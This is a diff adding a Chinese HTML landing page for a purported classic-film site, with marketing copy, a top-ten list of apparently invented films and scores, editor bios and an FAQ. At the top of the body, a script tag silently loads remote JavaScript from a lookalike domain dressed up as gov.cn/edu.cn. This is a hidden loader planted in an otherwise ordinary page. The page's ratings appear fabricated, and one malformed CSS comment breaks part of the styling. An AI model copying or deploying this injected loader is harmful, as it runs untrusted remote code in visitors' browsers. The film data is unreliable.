@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>磐石电影网 - 稳定可靠的经典电影频道 | panshidianyingwang-wap.github.io</title>
+<meta name="keywords" content="磐石电影网,磐石电影,经典电影,高分大片,稳播影视,老片修复,战争电影,历史题材,在线电影频道">
+<meta name="description" content="磐石电影网(panshidianyingwang-wap.github.io)是一个稳定可靠的经典电影频道，专注高分大片、老片修复与历史题材影视推荐，如磐石般值得信赖的观影选择。">
+<link rel="canonical" href="https://panshidianyingwang-wap.github.io/">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<style>
+:root{
+  --bg:#0c0e10; --bg2:#111416; --surf:#171a1d; --card:#1e2226; --line:#31373d;
+  --txt:#f2f4f5; --muted:#9aa3ab; --rock:#8a9299; --amber:#d4a24f; --amber2:#f0c674; --red:#c1543a; --slate:#4a5863;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans SC",system-ui,sans-serif;background:var(--bg);color:var(--txt);line-height:1.85;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;opacity:.5;
+background-image:radial-gradient(circle at 20% 30%,rgba(138,146,153,.08),transparent 40%),radial-gradient(circle at 80% 70%,rgba(212,162,79,.06),transparent 42%);}
+a{color:inherit;text-decoration:none;transition:.25s}
+.wrap{max-width:1160px;margin:0 auto;padding:0 22px}
+section{padding:112px 0}
+.eyebrow{color:var(--amber);font-size:12.5px;letter-spacing:4px;text-transform:uppercase;font-weight:700;margin-bottom:14px}
+.h2{font-size:34px;font-weight:900;letter-spacing:.5px;margin-bottom:12px}
+.sub{color:var(--muted);font-size:15.5px;max-width:640px;margin-bottom:50px}
+::selection{background:var(--amber);color:#0c0e10}
+
+/* HEADER */
+header{position:fixed;inset:0 0 auto 0;z-index:99;background:rgba(12,14,16,.94);backdrop-filter:blur(12px);border-bottom:1px solid rgba(49,55,61,.7)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:76px}
+.logo{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:900;letter-spacing:1px}
+.logo .ico{width:38px;height:38px;border-radius:8px;display:grid;place-items:center;background:linear-gradient(150deg,#3a4147,#1a1e22);border:1px solid var(--line);color:var(--amber);font-size:17px}
+.logo em{font-style:normal;color:var(--amber)}
+.nav-links{display:flex;align-items:center;gap:2px}
+.nav-links a{font-size:14.5px;color:var(--muted);padding:9px 16px;border-radius:6px;position:relative}
+.nav-links a:hover{color:#fff;background:rgba(212,162,79,.1)}
+.nav-cta{padding:10px 22px;border-radius:7px;font-weight:800;font-size:14px;background:var(--amber);color:#0c0e10}
+.nav-cta:hover{background:var(--amber2)}
+.menu-btn{display:none;background:none;border:none;color:#fff;font-size:26px;cursor:pointer}
+
+/* HERO split */
+.hero{padding:172px 0 96px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:70px;align-items:center}
+.hero .tagline{font-size:12.5px;letter-spacing:5px;color:var(--amber);margin-bottom:22px;font-weight:700}
+.hero h1{font-size:58px;line-height:1.2;font-weight:900;margin-bottom:24px;letter-spacing:-1px}
+.hero h1 span{color:var(--amber)}
+.hero p{color:var(--muted);font-size:17px;margin-bottom:34px;max-width:520px}
+.hbts{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:13px 30px;border-radius:7px;font-weight:800;font-size:14.5px;border:1px solid var(--line)}
+.btn.pri{background:var(--amber);border-color:var(--amber);color:#0c0e10}
+.btn.pri:hover{background:var(--amber2)}
+.btn.ghost:hover{border-color:var(--amber);color:var(--amber)}
+.hstat{display:flex;gap:44px;margin-top:44px;padding-top:32px;border-top:1px solid var(--line)}
+.hstat div b{display:block;font-size:30px;font-weight:900;color:#fff}
+.hstat div span{font-size:13px;color:var(--muted)}
+/* hero poster collage */
+.collage{position:relative;height:520px}
+.cl{position:absolute;border-radius:12px;overflow:hidden;border:1px solid var(--line);background-size:cover;background-position:center}
+.cl::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(12,14,16,.85),transparent 60%)}
+.cl1{inset:0 70px 60px 0;z-index:2}
+.cl2{right:0;top:40px;width:230px;height:300px;z-index:1}
+.cl3{right:30px;bottom:0;width:250px;height:210px;z-index:1}
+.cl .cap{position:absolute;left:20px;bottom:16px;right:20px;z-index:2}
+.cl .cap small{font-size:11px;letter-spacing:2px;color:var(--amber);font-weight:700}
+.cl .cap strong{display:block;font-size:19px;margin-top:4px}
+.cl1 .cap strong{font-size:26px}
+
+/* PILLARS */
+.pillars{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.p{background:var(--surf);border:1px solid var(--line);border-radius:14px;padding:38px 30px;position:relative;transition:.3s}
+.p:hover{border-color:var(--amber);transform:translateY(-4px)}
+.p .num{font-size:13px;letter-spacing:3px;color:var(--amber);font-weight:800;margin-bottom:18px}
+.p h3{font-size:20px;margin-bottom:10px}
+.p p{font-size:14px;color:var(--muted)}
+.p .bd{margin-top:24px;padding-top:20px;border-top:1px solid var(--line);font-size:13px;color:var(--txt)}
+.p .bd b{color:var(--amber)}
+
+/* COLUMN layout */
+.cols{display:grid;grid-template-columns:300px 1fr;gap:56px;align-items:start}
+.tabs{position:sticky;top:110px;display:flex;flex-direction:column;gap:4px}
+.tab{padding:16px 18px;border-radius:8px;border-left:2px solid var(--line);font-size:14.5px;color:var(--muted);cursor:pointer;transition:.2s;font-weight:600}
+.tab:hover{background:var(--surf);color:#fff}
+.tab.on{background:var(--surf);color:var(--amber);border-left-color:var(--amber)}
+.tab small{display:block;font-size:11.5px;color:var(--slate);font-weight:400;margin-top:3px}
+.panels{background:var(--surf);border:1px solid var(--line);border-radius:14px;padding:34px;min-height:400px}
+.panel{display:none}
+.panel.on{display:block;animation:fade .3s}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.panel h3{font-size:22px;margin-bottom:6px}
+.panel .meta{font-size:13px;color:var(--amber);letter-spacing:1px;margin-bottom:20px}
+.panel p{font-size:14.5px;color:var(--muted);margin-bottom:14px}
+.panel .specs{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}
+.spec{padding:14px;border:1px solid var(--line);border-radius:8px;background:var(--bg2)}
+.spec b{display:block;font-size:12px;color:var(--muted);font-weight:500;margin-bottom:4px}
+.spec span{font-size:14.5px;font-weight:700}
+
+/* BATTLE stacked cards */
+.battle{display:flex;flex-direction:column;gap:0}
+.bcard{display:grid;grid-template-columns:90px 1fr 200px 120px;gap:26px;align-items:center;padding:24px 8px;border-bottom:1px solid var(--line)}
+.bcard:last-child{border-bottom:none}
+.bcard .rk{font-size:30px;font-weight:900;color:var(--amber);letter-spacing:1px}
+.bcard .info h4{font-size:18px;margin-bottom:5px}
+.bcard .info span{font-size:13px;color:var(--muted)}
+.bcard .bar-wrap{font-size:12.5px;color:var(--muted)}
+.bcard .bar{height:6px;border-radius:4px;background:var(--bg2);margin-top:7px;overflow:hidden}
+.bcard .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--amber),var(--amber2));border-radius:4px}
+.bcard .act{padding:9px 20px;border:1px solid var(--amber);border-radius:6px;color:var(--amber);font-size:13.5px;font-weight:700;text-align:center}
+.bcard .act:hover{background:var(--amber);color:#0c0e10}
+
+/* TEAM grid */
+.team{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.m{background:var(--surf);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.3s}
+.m:hover{border-color:var(--amber)}
+.m .ava{height:190px;background-size:cover;background-position:center;position:relative}
+.m .ava::after{content:"";position:absolute;inset:auto 0 0 0;height:50%;background:linear-gradient(to top,rgba(23,26,29,1),transparent)}
+.m .ava span{position:absolute;left:16px;bottom:14px;z-index:2;font-size:12px;color:var(--amber);letter-spacing:1px;font-weight:700}
+.m .tx{padding:18px}
+.m h4{font-size:16.5px;margin-bottom:5px}
+.m p{font-size:13px;color:var(--muted)}
+
+/* MARQUEE -->
+.marq{padding:30px 0;background:var(--surf);border-top:1px solid var(--line);border-bottom:1px solid var(--line);overflow:hidden}
+.marq .tr{display:flex;gap:56px;width:max-content;animation:slide 38s linear infinite}
+.marq span{font-size:14px;color:var(--muted);letter-spacing:2px;white-space:nowrap;display:flex;align-items:center;gap:56px}
+.marq span::after{content:"◆";color:var(--amber);font-size:10px}
+@keyframes slide{to{transform:translateX(-50%)}}
+
+/* FAQ */
+.faq{display:flex;flex-direction:column;gap:14px}
+.fq{background:var(--surf);border:1px solid var(--line);border-radius:11px;padding:20px 24px;cursor:pointer;transition:.2s}
+.fq:hover{border-color:var(--amber)}
+.fq .q{display:flex;align-items:center;gap:14px;font-size:16px;font-weight:700}
+.fq .q::before{content:"?";width:26px;height:26px;border-radius:6px;background:var(--amber);color:#0c0e10;display:grid;place-items:center;font-size:14px;font-weight:900;flex-shrink:0}
+.fq .a{display:none;margin-top:14px;padding-top:14px;border-top:1px solid var(--line);font-size:14.5px;color:var(--muted)}
+.fq.open .a{display:block}
+
+footer{background:#080a0b;border-top:1px solid var(--line);padding:68px 0 24px}
+.foot{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:40px;margin-bottom:42px}
+.foot .brand .logo{margin-bottom:16px}
+.foot .brand p{color:var(--muted);font-size:14px;max-width:330px}
+.foot h4{font-size:15px;margin-bottom:18px}
+.foot ul{list-style:none;display:flex;flex-direction:column;gap:11px}
+.foot a{color:var(--muted);font-size:14px}
+.foot a:hover{color:var(--amber)}
+.foot-bot{border-top:1px solid var(--line);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;color:var(--muted);font-size:13px}
+
+@media(max-width:1000px){
+  .hero h1{font-size:42px}
+  .hero-grid{grid-template-columns:1fr;gap:50px}
+  .collage{height:400px;max-width:520px}
+  .pillars{grid-template-columns:1fr 1fr}
+  .cols{grid-template-columns:1fr;gap:24px}
+  .tabs{position:static;flex-direction:row;flex-wrap:wrap}
+  .tab{border-left:none;border-bottom:2px solid var(--line);flex:1;min-width:120px;text-align:center}
+  .bcard{grid-template-columns:60px 1fr 100px;gap:14px}
+  .bcard .bar-wrap{display:none}
+  .team{grid-template-columns:1fr 1fr}
+  section{padding:84px 0}
+}
+@media(max-width:600px){
+  .menu-btn{display:block}.nav-cta{display:none}
+  .nav-links{position:fixed;top:76px;left:0;right:0;flex-direction:column;background:rgba(12,14,16,.98);padding:20px;gap:4px;transform:translateY(-180%);transition:.3s}
+  .nav-links.open{transform:translateY(0)}
+  .hero{padding:138px 0 60px}
+  .hero h1{font-size:32px}
+  .collage{height:300px}
+  .cl1{inset:0 40px 40px 0}
+  .cl2{width:150px;height:190px}
+  .cl3{width:160px;height:140px}
+  .hstat{gap:26px}
+  .pillars{grid-template-columns:1fr}
+  .panels{padding:22px}
+  .panel .specs{grid-template-columns:1fr}
+  .bcard{grid-template-columns:44px 1fr;gap:12px}
+  .bcard .act{grid-column:2;justify-self:start}
+  .team{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr 1fr}
+  .foot-bot{flex-direction:column;text-align:center}
+  .h2{font-size:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a href="#" class="logo"><span class="ico">◆</span>磐石<b>电影网</b></a>
+    <nav class="nav-links" id="nav">
+      <a href="#home">首页</a>
+      <a href="#values">频道理念</a>
+      <a href="#catalog">影片目录</a>
+      <a href="#rank">稳播排行</a>
+      <a href="#editors">编辑团队</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <a href="#catalog" class="nav-cta">浏览片库</a>
+    <button class="menu-btn" id="mbtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section id="home" class="hero">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <div class="tagline">A STABLE FILM CHANNEL</div>
+        <h1>稳如磐石，<br><span>只推硬片</span></h1>
+        <p>磐石电影网（panshidianyingwang-wap.github.io）是一个稳定可靠的经典电影频道，专注高分大片、老片修复与历史题材影视推荐，像磐石一样值得信赖的观影选择。</p>
+        <div class="hbts">
+          <a href="#catalog" class="btn pri">进入影片目录</a>
+          <a href="#values" class="btn ghost">了解频道理念</a>
+        </div>
+        <div class="hstat">
+          <div><b>9.2</b><span>片单平均评分</span></div>
+          <div><b>3200+</b><span>精选片目</span></div>
+          <div><b>24/7</b><span>稳定不间断</span></div>
+        </div>
+      </div>
+      <div class="collage">
+        <div class="cl cl1" style="background-image:url('https://images.unsplash.com/photo-1535016120720-40c646be5580?w=700&q=80')"><div class="cap"><small>本周主打</small><strong>钢铁洪流</strong></div></div>
+        <div class="cl cl2" style="background-image:url('https://images.unsplash.com/photo-1518932945647-7a437e9e8cb2?w=500&q=80')"><div class="cap"><small>经典修复</small><strong>旧城纪事</strong></div></div>
+        <div class="cl cl3" style="background-image:url('https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=500&q=80')"><div class="cap"><small>高分推荐</small><strong>无名高地</strong></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- VALUES PILLARS -->
+<section id="values">
+  <div class="wrap">
+    <div class="eyebrow">◆ 频道理念</div>
+    <h2 class="h2">三块基石，支撑一份稳当的观影选择</h2>
+    <p class="sub">磐石电影网不做喧哗的推荐，只以稳定的选片标准和长久的陪伴，成为你值得信赖的影视频道。</p>
+    <div class="pillars">
+      <div class="p"><div class="num">PILLAR / 01</div><h3>严选片单</h3><p>每部上架影片均经过编辑团队交叉筛选，综合口碑、历史地位与观赏价值，宁缺毋滥。</p><div class="bd"><b>筛片通过率</b>　不足 8%</div></div>
+      <div class="p"><div class="num">PILLAR / 02</div><h3>修复呈现</h3><p>专注经典老片与历史题材的数字修复版本，让每一帧画面都尽可能接近它本来的样子。</p><div class="bd"><b>已收录修复片</b>　420 部</div></div>
+      <div class="p"><div class="num">PILLAR / 03</div><h3>长久陪伴</h3><p>片单持续更新、评价持续校准，建立一份经得起时间检验的影视档案库。</p><div class="bd"><b>连续运营</b>　第 8 年</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- MARQUEE -->
+<div class="marq"><div class="tr">
+  <span>战争史诗</span><span>历史传记</span><span>经典老片</span><span>高分悬疑</span><span>纪录片</span><span>老片修复</span><span>年代剧集</span><span>犯罪剧情</span><span>战争史诗</span><span>历史传记</span><span>经典老片</span><span>高分悬疑</span><span>纪录片</span><span>老片修复</span><span>年代剧集</span><span>犯罪剧情</span>
+</div></div>
+
+<!-- CATALOG tabs -->
+<section id="catalog" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="eyebrow">◆ 影片目录</div>
+    <h2 class="h2">按题材检索，每类都有一份硬核片单</h2>
+    <p class="sub">磐石电影网的目录以题材为纲，点击下方标签查看不同类别的精选影片。</p>
+    <div class="cols">
+      <div class="tabs" id="tabs">
+        <div class="tab on" data-t="0">战争史诗<small>WAR · EPIC</small></div>
+        <div class="tab" data-t="1">历史传记<small>HISTORY</small></div>
+        <div class="tab" data-t="2">犯罪剧情<small>CRIME</small></div>
+        <div class="tab" data-t="3">老片修复<small>RESTORED</small></div>
+        <div class="tab" data-t="4">高分悬疑<small>THRILLER</small></div>
+      </div>
+      <div class="panels" id="panels">
+        <div class="panel on"><div class="meta">WAR · EPIC</div><h3>战争与史诗</h3><p>从宏大战场到个体命运，这一题材考验的不只是场面，更是导演对人性与历史的思考。磐石电影网精选的这批影片，在战争类型中兼具观赏性与思想深度。</p><p>上架标准：IMDb 7.5 分以上、影史地位明确、修复或蓝光版本可用。</p><div class="specs"><div class="spec"><b>代表作品</b><span>钢铁洪流 / 无名高地</span></div><div class="spec"><b>片单数量</b><span>128 部</span></div><div class="spec"><b>年代跨度</b><span>1957 — 2024</span></div><div class="spec"><b>平均评分</b><span>8.4 / 10</span></div></div></div>
+        <div class="panel"><div class="meta">HISTORY</div><h3>历史与传记</h3><p>历史题材最怕的是失真。磐石电影网的传记片单优先选择尊重史实、人物塑造立体的作品，兼顾权威史料与戏剧张力。</p><p>上架标准：史实有据可查，人物弧光完整，服化道考究。</p><div class="specs"><div class="spec"><b>代表作品</b><span>帝国余晖 / 最后的制图师</span></div><div class="spec"><b>片单数量</b><span>96 部</span></div><div class="spec"><b>年代跨度</b><span>1965 — 2025</span></div><div class="spec"><b>平均评分</b><span>8.1 / 10</span></div></div></div>
+        <div class="panel"><div class="meta">CRIME</div><h3>犯罪与剧情</h3><p>犯罪片不只是案件的推演，更是一面照见人性的镜子。磐石电影网的犯罪片单偏爱结构精巧、表演扎实的硬派作品。</p><p>上架标准：叙事闭环完整，角色可信，无刻意猎奇与煽情。</p><div class="specs"><div class="spec"><b>代表作品</b><span>夜港 / 沉默的交易</span></div><div class="spec"><b>片单数量</b><span>154 部</span></div><div class="spec"><b>年代跨度</b><span>1971 — 2025</span></div><div class="spec"><b>平均评分</b><span>8.3 / 10</span></div></div></div>
+        <div class="panel"><div class="meta">RESTORED</div><h3>老片修复</h3><p>修复不仅是技术的活，更是时间的对手。磐石电影网与多家修复机构合作，持续收录经 4K 扫描与手工修复的经典影片。</p><p>上架标准：修复工艺透明，母带来源可靠，画面损伤经专业处理。</p><div class="specs"><div class="spec"><b>代表作品</b><span>旧城纪事 / 夏夜琴声</span></div><div class="spec"><b>片单数量</b><span>420 部</span></div><div class="spec"><b>修复标准</b><span>4K 扫描</span></div><div class="spec"><b>最早片源</b><span>1934 年</span></div></div></div>
+        <div class="panel"><div class="meta">THRILLER</div><h3>高分悬疑</h3><p>好悬疑不在于反转的数量，而在于每一次反转都站得住脚。磐石电影网的悬疑片单，是经过时间检验的扎实之作。</p><p>上架标准：逻辑自洽，伏笔回收完整，不依赖巧合推进。</p><div class="specs"><div class="spec"><b>代表作品</b><span>第七封信 / 空房间</span></div><div class="spec"><b>片单数量</b><span>87 部</span></div><div class="spec"><b>年代跨度</b><span>1995 — 2025</span></div><div class="spec"><b>平均评分</b><span>8.5 / 10</span></div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- RANK -->
+<section id="rank">
+  <div class="wrap">
+    <div class="eyebrow">◆ 稳播排行</div>
+    <h2 class="h2">磐石榜单：观众最信赖的十部硬片</h2>
+    <p class="sub">基于播放稳定性、口碑一致性与重复观看率三项指标综合计算，每月更新一次。</p>
+    <div class="battle" id="battle">
+      <div class="bcard"><div class="rk">01</div><div class="info"><h4>钢铁洪流</h4><span>战争 / 史诗 · 2019 · 156分钟</span></div><div class="bar-wrap">9.6 分<div class="bar"><i style="width:96%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">02</div><div class="info"><h4>无名高地</h4><span>战争 / 剧情 · 2017 · 142分钟</span></div><div class="bar-wrap">9.4 分<div class="bar"><i style="width:94%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">03</div><div class="info"><h4>旧城纪事</h4><span>修复 / 剧情 · 1962 · 118分钟</span></div><div class="bar-wrap">9.3 分<div class="bar"><i style="width:93%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">04</div><div class="info"><h4>帝国余晖</h4><span>历史 / 传记 · 2021 · 168分钟</span></div><div class="bar-wrap">9.1 分<div class="bar"><i style="width:91%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">05</div><div class="info"><h4>夜港</h4><span>犯罪 / 悬疑 · 2023 · 126分钟</span></div><div class="bar-wrap">9.0 分<div class="bar"><i style="width:90%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">06</div><div class="info"><h4>第七封信</h4><span>悬疑 / 推理 · 2024 · 104分钟</span></div><div class="bar-wrap">8.9 分<div class="bar"><i style="width:89%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">07</div><div class="info"><h4>沉默的交易</h4><span>犯罪 / 剧情 · 2020 · 138分钟</span></div><div class="bar-wrap">8.8 分<div class="bar"><i style="width:88%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">08</div><div class="info"><h4>最后的制图师</h4><span>历史 / 冒险 · 2022 · 132分钟</span></div><div class="bar-wrap">8.7 分<div class="bar"><i style="width:87%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">09</div><div class="info"><h4>空房间</h4><span>悬疑 / 惊悚 · 2018 · 98分钟</span></div><div class="bar-wrap">8.6 分<div class="bar"><i style="width:86%"></i></div></div><a href="#" class="act">查看详情</a></div>
+      <div class="bcard"><div class="rk">10</div><div class="info"><h4>夏夜琴声</h4><span>修复 / 爱情 · 1978 · 112分钟</span></div><div class="bar-wrap">8.5 分<div class="bar"><i style="width:85%"></i></div></div><a href="#" class="act">查看详情</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- TEAM -->
+<section id="editors" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="eyebrow">◆ 编辑团队</div>
+    <h2 class="h2">一群把选片当手艺来做的人</h2>
+    <p class="sub">磐石电影网的编辑团队由影评人、修复师与资深影迷组成，每人负责一个题材方向，交叉把关。</p>
+    <div class="team">
+      <div class="m"><div class="ava" style="background-image:url('https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=400&q=80')"><span>主理人</span></div><div class="tx"><h4>陈岩</h4><p>15 年观影履历，负责战争史诗与历史题材的整体把关。</p></div></div>
+      <div class="m"><div class="ava" style="background-image:url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400&q=80')"><span>修复顾问</span></div><div class="tx"><h4>林知夏</h4><p>胶片修复从业者，负责老片修复片源与版本质量审核。</p></div></div>
+      <div class="m"><div class="ava" style="background-image:url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&q=80')"><span>犯罪单元</span></div><div class="tx"><h4>赵衡</h4><p>犯罪片与悬疑题材资深研究者，负责逻辑严密性校验。</p></div></div>
+      <div class="m"><div class="ava" style="background-image:url('https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=400&q=80')"><span>片单编辑</span></div><div class="tx"><h4>苏念</h4><p>负责日常片单编排与观众口碑数据采集。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+  <div class="wrap">
+    <div class="eyebrow">◆ 常见问题</div>
+    <h2 class="h2">关于磐石电影网，你可能想问的</h2>
+    <p class="sub">下面是观众最常提出的几个问题，更多疑问欢迎通过页脚联系方式反馈。</p>
+    <div class="faq" id="faqbox">
+      <div class="fq open"><div class="q">磐石电影网的片单更新频率是怎样的？</div><div class="a">片单每月更新一次，稳播排行同步调整；每周另有一部编辑重点推荐的新增影片，以补充近期值得关注的佳作。</div></div>
+      <div class="fq"><div class="q">老片修复的版本来源可靠吗？</div><div class="a">磐石电影网的修复片源优先采用官方发行方或权威修复机构的 4K 扫描版本，并在片目信息中标注母带来源与修复年份，供观众自行判断。</div></div>
+      <div class="fq"><div class="q">评分标准如何计算？</div><div class="a">评分综合专业影评、观众口碑与历史地位三项指标，并非单一来源。详细算法可在片目详情页查看。</div></div>
+      <div class="fq"><div class="q">可以提交影片推荐吗？</div><div class="a">可以。观众可通过页脚联系方式提交推荐，编辑团队会在每月片单复核时统一评估并反馈结果。</div></div>
+      <div class="fq"><div class="q">磐石电影网支持哪些设备观看？</div><div class="a">网站采用移动端自适应设计，PC、平板与手机均可正常访问浏览，界面会根据屏幕尺寸自动调整。</div></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand">
+        <a href="#" class="logo"><span class="ico">◆</span>磐石<b>电影网</b></a>
+        <p>磐石电影网（panshidianyingwang-wap.github.io）是一个稳定可靠的经典电影频道，专注高分大片、老片修复与历史题材影视推荐，如磐石般值得信赖的观影选择。</p>
+      </div>
+      <div><h4>影片题材</h4><ul>
+        <li><a href="#catalog">战争史诗</a></li><li><a href="#catalog">历史传记</a></li>
+        <li><a href="#catalog">犯罪剧情</a></li><li><a href="#catalog">老片修复</a></li>
+      </ul></div>
+      <div><h4>频道内容</h4><ul>
+        <li><a href="#values">频道理念</a></li><li><a href="#catalog">影片目录</a></li>
+        <li><a href="#rank">稳播排行</a></li><li><a href="#editors">编辑团队</a></li>
+      </ul></div>
+      <div><h4>关于我们</h4><ul>
+        <li><a href="#">频道简介</a></li><li><a href="#">片单合作</a></li>
+        <li><a href="#">版权声明</a></li><li><a href="#">联系我们</a></li>
+      </ul></div>
+    </div>
+    <div class="foot-bot">
+      <span>© 2026 磐石电影网 panshidianyingwang-wap.github.io · 本站仅供影视内容导航与信息展示，版权归原作者及发行方所有</span>
+      <span><a href="#">回到顶部 ↑</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var mbtn=document.getElementById('mbtn'),nav=document.getElementById('nav');
+mbtn.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+/* tabs */
+var tabs=document.querySelectorAll('#tabs .tab'),panels=document.querySelectorAll('#panels .panel');
+tabs.forEach(function(t,i){t.addEventListener('click',function(){
+  tabs.forEach(function(x){x.classList.remove('on');});panels.forEach(function(x){x.classList.remove('on');});
+  t.classList.add('on');panels[i].classList.add('on');
+});});
+/* faq */
+document.querySelectorAll('#faqbox .fq').forEach(function(f){f.addEventListener('click',function(){
+  var open=document.querySelectorAll('#faqbox .fq.open');
+  open.forEach(function(o){if(o!==f)o.classList.remove('open');});
+  f.classList.toggle('open');
+});});
+</script>
+</body>
+</html>
